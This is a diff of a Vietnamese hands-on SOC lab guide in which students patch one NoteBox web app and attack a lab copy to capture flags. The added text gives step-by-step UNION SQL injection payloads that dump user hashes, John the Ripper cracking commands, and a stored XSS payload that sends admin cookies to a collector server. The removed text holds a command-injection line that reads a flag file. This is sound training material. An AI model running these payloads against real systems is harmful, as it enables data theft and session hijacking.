@@ -1,40 +1,99 @@
-=== SOC Lab KB5: Patch & Pwn (Hybrid Blue + Red) ===
+================================================================================
+ SOC LAB (KB5): PATCH & PWN - HYBRID BLUE + RED   (web app "NoteBox", MariaDB)
+================================================================================
 
-He A (targeta, 172.20.0.10) cua ban dang bi tan cong COMMAND INJECTION lien tuc tu ke tan cong.
-He B (targetb, 172.20.0.40) la may "production" co LO HONG Y HET A nhung chua duoc va.
+1. TONG QUAN (OVERVIEW)
+--------------------------------------------------------------------------------
+"NoteBox" la web app ghi chu ca nhan (dang ky/dang nhap/tao-xem-tim note). He A (targeta,
+172.20.0.10) - NoteBox cua ban - dang bi tan cong lien tuc tu 172.20.0.5 bang: UNION SQL
+injection (o tim kiem) va Stored XSS (admin xem note bi chay JS). He B (targetb, 172.20.0.40)
+la ban sao "production" CHUA VA, chi vao qua HTTP, chua 2 bi mat: FLAG he thong va XSS flag.
 
-Nhiem vu 2 phan:
-  * BLUE (50%): dieu tra qua SIEM, VA he A de ke tan cong khong con chay duoc lenh.
-  * RED  (50%): dung chinh ky thuat do PWN he B (chi qua HTTP), lay FLAG.
+Ban dong ca hai vai (nhu mot tran Attack & Defense CTF):
+  * BLUE: dieu tra qua SIEM, VA ca 2 lo hong tren A - ma dich vu VAN CHAY DUNG.
+  * RED : khai thac he B de lay CA 2 flag roi NOP qua /submit.php.
 
-*** Lan dau: cho siem cai Wazuh xong (~8-10'):  tail -f /var/log/wazuh-install.log ***
+2. MUC TIEU HOC TAP (OBJECTIVES)
+--------------------------------------------------------------------------------
+  - Thuc hanh quy trinh UNION SQL injection day du (do loi -> dem cot -> union -> trich xuat).
+  - Hieu hau qua "bam mat khau yeu" (MD5 khong salt) + mat khau yeu -> bi crack.
+  - Hieu Stored XSS + danh cap cookie qua C2.
+  - Va dung cach (prepared statement, escape output) ma khong lam hong chuc nang (SLA).
 
-==================== PHAN BLUE: VA HE A ====================
---- 1) Dieu tra (defender, Firefox) ---
-  https://172.20.0.20  admin / (tren siem: sudo cat /root/wazuh-admin-credentials.txt)
-  -> Xem su kien web: ke tan cong goi gi toi /ping.php? Payload command injection la gi?
-     (goi y: host=127.0.0.1;id  -> dau ';' noi them lenh)
+3. KIEN THUC NEN (BACKGROUND)
+--------------------------------------------------------------------------------
+* UNION SQLi: khi truy van ghep chuoi, ke tan cong them "UNION SELECT ..." de noi du lieu bang
+  khac vao ket qua. Can biet SO COT va cot nao HIEN THI. (MySQL: co version(), database(),
+  user(), va information_schema de liet ke bang/cot.)
+* Bam mat khau: dung md5crypt ($1$... - thuat toan yeu) + mat khau yeu => dump hash roi crack
+  bang wordlist la ra.
+* Stored XSS: noi dung do nguoi dung nhap duoc hien thi KHONG escape -> <script> chay trong
+  trinh duyet nguoi XEM. Neu admin xem -> chay trong phien admin -> co the danh cap cookie.
+* NoteBox: /register.php, /login.php (prepared - khong SQLi), /dashboard.php (note cua ban +
+  tao note + o tim kiem), /note.php?id= (DIEM YEU: Stored XSS), /search.php?q= (DIEM YEU: SQLi),
+  /admin.php (chi admin; DIEM YEU: Stored XSS). App in body note KHONG escape o CA note.php lan
+  admin.php -> phai va ca hai noi.
 
---- 2) Va he A (SSH tu defender) ---
-  ssh analyst@targeta       (mat khau: analyst)
-  Cach 1 (WAF): bat ModSecurity + rule chan ky tu nguy hiem:
-    sudo sed -i 's/^SecRuleEngine .*/SecRuleEngine On/' /etc/modsecurity/modsecurity.conf
-    sudo tee /etc/modsecurity/custom.conf >/dev/null <<'EOF'
-    SecRule ARGS "@rx [;|&\`$()]" "id:100001,phase:2,deny,status:403,log,msg:'CMD injection blocked'"
-    EOF
-    sudo systemctl reload apache2
-  Cach 2 (sua code): sua /var/www/html/ping.php dung escapeshellarg($host).
-  Kiem chung: curl "http://localhost/ping.php?host=127.0.0.1;id"   # KHONG con dong uid=
-              curl "http://localhost/ping.php?host=127.0.0.1"       # ping thuong van chay
+4. MOI TRUONG & SO DO (TOPOLOGY)
+--------------------------------------------------------------------------------
+  attacker (172.20.0.5, AN)  -- khai thac SQLi + cam XSS vao A
+  targeta  (172.20.0.10)     -- HE A: NoteBox + Wazuh agent; ban VA tai day (SSH analyst)
+  targetb  (172.20.0.40)     -- HE B: NoteBox co 2 flag, CHI HTTP; ban PWN
+  siem     (172.20.0.20)     -- Wazuh dashboard (https://172.20.0.20)
+  defender (172.20.0.30)     -- tram cua ban: Firefox + curl + python3 + wordlist.txt (crack)
+  *** Lan dau cho siem cai Wazuh (~8-10'):  tail -f /var/log/wazuh-install.log ***
 
-==================== PHAN RED: PWN HE B ====================
---- 3) Khai thac B qua HTTP (tu defender) ---
-  He B chi vao duoc qua web. Dung chinh lo hong command injection de doc flag:
-    curl "http://172.20.0.40/ping.php?host=127.0.0.1;cat%20/var/www/flag.txt"
-    -> doc FLAG-xxxxxx (moi sinh vien mot gia tri khac)
-  Ghi flag ra /tmp/loot.txt tren B (bang chung PWN) de he thong cham diem:
-    curl "http://172.20.0.40/ping.php?host=127.0.0.1;cat%20/var/www/flag.txt%20>%20/tmp/loot.txt"
-  Ghi flag vao bao cao: sua /home/analyst/findings.txt tren A:  FLAG=FLAG-xxxxxx
+5. NHIEM VU (TASKS)
+--------------------------------------------------------------------------------
+--- PHAN BLUE (tren he A) ---
 
-Xong: checkwork / stoplab.
-Muc tieu: mission_complete = Y  (blue_done: A het dinh + con song; red_done: pwn duoc B).
+Task 1 - Dieu tra qua dashboard Wazuh (https://172.20.0.20):
+  Loc su kien web agent targeta theo IP nguon. Ke tan cong (172.20.0.5) goi gi? Nhan ra:
+    (a) /search.php?q=... co cu phap SQL (ORDER BY, UNION SELECT, information_schema) -> SQLi
+    (b) note chua <script> (hien o admin panel) -> Stored XSS
+  Ghi ATTACKER_IP, VULN1, VULN2 vao bao cao /home/analyst/findings.txt.
+
+Task 2 - VA he A (SSH analyst@targeta, mat khau: analyst; ma nguon /var/www/html):
+    - search.php : dung PREPARED STATEMENT cho tu khoa (va nen AN loi SQL - khong echo $db->error).
+    - note.php VA admin.php : ESCAPE body note khi in (htmlspecialchars) - app chua escape o CA HAI,
+      phai va ca hai moi het Stored XSS.
+  *** Khong va qua tay: dang nhap/tao/xem/tim note cua minh PHAI con chay (checker se kiem). ***
+
+--- PHAN RED (tren he B, tu defender) ---
+
+Task 3 - UNION SQL injection tung buoc (o o tim kiem /search.php - dung trinh duyet/Burp/curl):
+   B1. Do loi: nhap  '   "   )   -> trang bao "Loi SQL..." => dinh SQLi.
+   B2. Dem cot: ...%' ORDER BY 1 --  tang dan den khi loi => so cot (o day 2).
+   B3. Tim cot hien thi: ...%' UNION SELECT 1,2 --  => thay so nao hien ra.
+   B4. Trinh sat: ...%' UNION SELECT version(),database() --
+   B5. Liet ke bang: ...%' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() --
+   B6. Liet ke cot: ...%' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --
+   B7. Dump users: ...%' UNION SELECT username,password FROM users --   => lay admin + hash md5crypt ($1$...).
+
+Task 4 - Crack hash + dang nhap admin + lay FLAG:
+   - Hash admin co dang md5crypt (admin:$1$....). Luu dong 'username:hash' vao file roi crack
+     bang John the Ripper + wordlist co san (john tu nhan dien md5crypt, khong can --format):
+       echo 'admin:$1$....' > hash.txt
+       john --wordlist=/home/ubuntu/wordlist.txt hash.txt
+       john --show hash.txt                            # -> admin:<mat khau>
+   - Dang nhap admin bang mat khau crack duoc -> mo /admin.php -> doc "Bi mat he thong" = FLAG.
+   - Nop:  http://172.20.0.40/submit.php?flag=FLAG-xxxxxx
+
+Task 5 - Stored XSS cuop cookie admin (XSS flag):
+   - Tren defender mo C2 nhan cookie, vd:   python3 -m http.server 8000
+   - Dang ky 1 tai khoan thuong, tao note co payload:
+       <script>new Image().src='http://172.20.0.30:8000/?c='+document.cookie</script>
+   - Dang nhap admin (o Task 4) roi mo /admin.php -> payload chay trong phien admin -> gui
+     cookie ve C2. Trong cookie co 'ssession=XSSFLAG-xxxxxx'.
+   - Nop:  http://172.20.0.40/submit.php?xss=XSSFLAG-xxxxxx
+   (Neu VM co internet, co the dung webhook.site thay cho C2 noi bo.)
+
+6. NOP BAI (SUBMISSION)
+--------------------------------------------------------------------------------
+  Hoan tat findings.txt (ATTACKER_IP, VULN1, VULN2). checkwork -> tu kiem tra ; stoplab -> nop.
+  Cac muc cham (chi cham VIEC BAN LAM):
+    - blue_patched : A het SQLi + het XSS VA dich vu con chay dung (SLA).
+    - reported     : bao cao dung IP + 2 lo hong.
+    - red_flag     : da nop dung FLAG he thong cua B.
+    - red_xss      : da nop dung XSS flag cua B.
+    - mission_complete : va xong 2 lo hong (A song) + lay ca 2 flag cua B.
